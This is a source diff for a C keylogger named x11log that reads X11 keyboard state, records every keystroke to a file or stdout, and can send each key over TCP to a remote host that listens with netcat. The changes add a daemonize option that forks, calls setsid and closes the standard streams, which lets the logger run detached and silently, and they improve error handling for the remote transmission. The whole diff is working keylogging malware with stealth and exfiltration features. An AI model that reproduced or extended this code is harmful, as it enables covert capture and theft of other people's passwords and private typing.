@@ -15,6 +15,7 @@
 #include <ctype.h>       /* toupper() */
 
 #include <sys/types.h>   /* time_t */
+#include <sys/stat.h>    /* umask() */
 #include <time.h>        /* time(), localtime(), asctime() */
 #include <sys/socket.h>  /* socket(), send() */
 #include <netinet/in.h>  /* inet datatypes */
@@ -39,7 +40,7 @@ static char keymap[2][XKBD_WIDTH],
 static FILE *output;
 static XModifierKeymap *map;
 static Display *dsp;
-static int silent;
+static int verbosity = 1;
 
 
 /* Here we go. */
@@ -50,8 +51,6 @@ int main (int argc, char ** argv) {
 
 	timestart = initialize(argc, argv, &opts);
 
-	silent = opts->silent;
-
 	/* NULL defaults to what is given in DISPLAY environment variable. However,
 	 * in some cases (e.g. within a VC) this variable is not set; so better go
 	 * with :0.0, which is the correct default display in 99% of all cases. This
@@ -60,13 +59,11 @@ int main (int argc, char ** argv) {
 	if(!dsp)
 		fatal("Cannot open display");
 
-	log(1, "%s\n", "dd");
-
 	XSynchronize (dsp, True);
 	map = XGetModifierMapping(dsp);
 
 	XQueryKeymap(dsp, kbd);
-	fprintf(output, "\n\n--New Session at %s\n", asctime(timestart));
+	log(1, stderr, "\n\n--New Session at %s\n", asctime(timestart));
 
 	/* we'll only try to find changed keys */
 	for(;; usleep(DELAY)){
@@ -75,11 +72,14 @@ int main (int argc, char ** argv) {
 
 		for (i = 0; i < XKBD_WIDTH * BYTE_LENGTH; i++)
 			if(getbit(kbd, i) != getbit(tmp, i) && getbit(kbd, i)) {
-				fprintf(output, "%s", (char*)decodeKey(i, getbit(kbd, i), getMods(kbd)));
+				log( 1, output, "%s", (char*)decodeKey(i, getbit(kbd, i), getMods(kbd)));
 				fflush(output);
 
-				if(opts.log_remote)
-					transmit_keystroke_inet((char*)decodeKey(i, getbit(kbd, i), getMods(kbd)), &opts);
+				if(opts.log_remote) {
+					int ec;
+					ec = transmit_keystroke_inet((char*)decodeKey(i, getbit(kbd, i), getMods(kbd)), &opts);
+					if (ec < 0) printf("Transmit error: %d", ec);
+				}
 			}
 	}
 }
@@ -94,8 +94,8 @@ struct tm* initialize(int argc, char ** argv, struct opts_struct* opts) {
 
 	/* connect signals to handler-functions */
 	signal(SIGTERM, signal_handler);
-	signal(SIGINT, signal_handler);
-	signal(SIGHUP, signal_handler);
+	signal(SIGINT,  signal_handler);
+	signal(SIGHUP,  signal_handler);
 
 	/* set default values for cmdline options */
 	opts->display = X_DEFAULT_DISPLAY;
@@ -105,9 +105,10 @@ struct tm* initialize(int argc, char ** argv, struct opts_struct* opts) {
 	opts->remote_addr = NULL;
 	opts->host = NULL;
 	opts->port = 0;
+	opts->daemonize = 0;
 
 	/* parse cmdline arguments */
-	while((c = getopt(argc, argv, "d:f:h?r:s")) != -1){
+	while((c = getopt(argc, argv, "d:f:h?r:sb")) != -1){
 		switch(c) {
 			case 'd':
 				opts->display = optarg;
@@ -121,14 +122,20 @@ struct tm* initialize(int argc, char ** argv, struct opts_struct* opts) {
 				break;
 			case 's':
 				opts->silent = 1;
+				verbosity = 0;
+				break;
+			case 'b':
+				opts->daemonize = 1;
+				break;
 			case 'h':
 			case '?':
-				fprintf(stderr, " usage: %s [OPTION]\n", argv[0]);
-				fprintf(stderr, " Available options:\n");
-				fprintf(stderr, "\t-d <DISPLAY>   X-Display to use, default is :0.0\n");
-				fprintf(stderr, "\t-f <LOGFILE>   Log keystrokes to file instead of STDOUT. Text is appended; creates file if necessary.\n");
-				fprintf(stderr, "\t-r <HOST:PORT> Log keystrokes to remote host. The other end needs a listening daemon on given port\n\t\t\t(e.g. using netcat: 'nc -p <port> -k')\n");
-				fprintf(stderr, "\t-s             Be silent (no stdout).\n");
+				log(0, stderr, " usage: %s [OPTION]\n", argv[0]);
+				log(0, stderr, " Available options:\n");
+				log(0, stderr, "\t-d <DISPLAY>   X-Display to use, default is :0.0\n");
+				log(0, stderr, "\t-f <LOGFILE>   Log keystrokes to file instead of STDOUT. Text is appended; creates file if necessary.\n");
+				log(0, stderr, "\t-r <HOST:PORT> Log keystrokes to remote host. The other end needs a listening daemon on given port\n\t\t\t(e.g. using netcat: 'nc -p <port> -k')\n");
+				log(0, stderr, "\t-b             Daemonize (requires -f or -r or both).\n");
+				log(0, stderr, "\t-s             Be silent (no stdout).\n");
 
 				exit(EXIT_FAILURE);
 			default:
@@ -136,15 +143,25 @@ struct tm* initialize(int argc, char ** argv, struct opts_struct* opts) {
 		}
 	}
 
+	/* logical constraints */
+	if(opts->silent && !(opts->log_remote || opts->logfile))
+		fatal("Argument -s requires either -r or -f");
+	if(opts->daemonize && !(opts->log_remote || opts->logfile))
+		fatal("Argument -b requires either -r or -f");
+
+	/* to daemonize or not to daemonize */
+	if(opts->daemonize)
+		daemonize();
+
 	/* log to file if given, use stdout otherwise  */
 	if(opts->logfile == NULL) {
-		fprintf(stderr, "Logging to stdout\n");
+		log(1, stderr, "Logging to stdout\n");
 		output = stdout;
 	} else {
-		fprintf(stderr, "Logging to file %s\n", opts->logfile);
+		log(1, stderr, "Logging to file %s\n", opts->logfile);
 		output = fopen(opts->logfile, "a");
 		if(!output) {
-			fprintf(stderr, "Error writing to %s, fallback to console.\n", argv[1]);
+			log(1, stderr, "Error writing to %s, fallback to console.\n", argv[1]);
 			output = stdout;
 		}
 	}
@@ -156,9 +173,9 @@ struct tm* initialize(int argc, char ** argv, struct opts_struct* opts) {
 		opts->host = strtok(opts->remote_addr, ":");
 		opts->port = atol( strtok(NULL, ":") );
 
-		if(opts->port <= 0 || opts->port > 65535)
+		if(opts->port < TCP_PORT_MIN || opts->port > TCP_PORT_MAX)
 			fatal("Invalid tcp port number");
-	} else {
+	} else if (opts->remote_addr != NULL) {
 		fatal("Illegal argument for remote logging");
 	}
 
@@ -254,14 +271,14 @@ void signal_handler(int sig) {
 	  //SIGINT and SIGTERM quit application
 	  case(SIGINT):
 	  case(SIGTERM):
-		fprintf(stderr, "\n -- x11log terminated.\n");
+		log(1, stderr, "\n -- x11log terminated.\n");
 		if(output != stdout)
 			fclose(output);
 
 		exit(EXIT_SUCCESS);
 	  //SIGHUP forces flushing of buffer
 	  case(SIGHUP):
-		fprintf(stderr, "\n -- SIGHUP: log flushed.\n");
+		log(1, stderr, "\n -- SIGHUP: log flushed.\n");
 		fflush(output);
 	  	return; 
 	}
@@ -272,7 +289,7 @@ void signal_handler(int sig) {
  * */
 void fatal(const char * msg){
 	if(msg != NULL)
-		fprintf(stderr, "Fatal: %s.\n", msg);
+		log(0, stderr, "Fatal: %s.\n", msg);
 	exit(EXIT_FAILURE);
 }
 
@@ -287,7 +304,9 @@ int transmit_keystroke_inet(char* key, struct opts_struct *opts){
 	struct hostent *host;
 	struct sockaddr_in server_addr;
 
-	host = gethostbyname( opts->host );
+	if((host = gethostbyname( opts->host )) == NULL)
+		return ERR_DNS;
+
 	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
 		return ERR_SOCKET;
 
@@ -296,9 +315,9 @@ int transmit_keystroke_inet(char* key, struct opts_struct *opts){
 	server_addr.sin_addr = *((struct in_addr *)host->h_addr);
 	bzero(&(server_addr.sin_zero),8);
 
-	if(connect(sock,
-			(struct sockaddr*)&server_addr, sizeof(struct sockaddr)) == -1)
-		return ERR_CONNECT;
+	if(connect(sock, (struct sockaddr*)&server_addr, sizeof(struct sockaddr)) == -1) {
+	printf("\nXXX: %s\n", strerror(errno));
+		return ERR_CONNECT; }
 
 	bytes_sent = send(sock, key, strlen(key), 0);
 	close(sock);
@@ -309,12 +328,39 @@ int transmit_keystroke_inet(char* key, struct opts_struct *opts){
 /**
  * printf() wrapper, taking care of debug levels
  * */
-void log(int level, const char *fmt, ...) {
-	if(silent)
-		return;
-
+void log(int level, FILE* stream, const char *fmt, ...) {
 	va_list args;
 	va_start(args, fmt);
-	vfprintf(stdout, fmt, args);
+	
+	if(verbosity >= level || (stream != stdout && stream != stderr))
+		vfprintf(stream, fmt, args);
+
 	va_end(args);
+}
+
+
+int daemonize(){
+	pid_t pid, sid;
+	
+	pid  = fork();
+	if(pid < 0) 
+		fatal("Error forking process");
+
+	if(pid > 0)
+		exit(EXIT_SUCCESS);
+	
+	umask(0);
+
+	sid = setsid();
+	if(sid < 0)
+		fatal("Error setting SID for child process");
+
+	if(chdir("/") < 0)
+		fatal("Error setting work directory to /");
+	
+	close(STDIN_FILENO);
+	close(STDOUT_FILENO);
+	close(STDERR_FILENO);
+
+	return pid;
 }
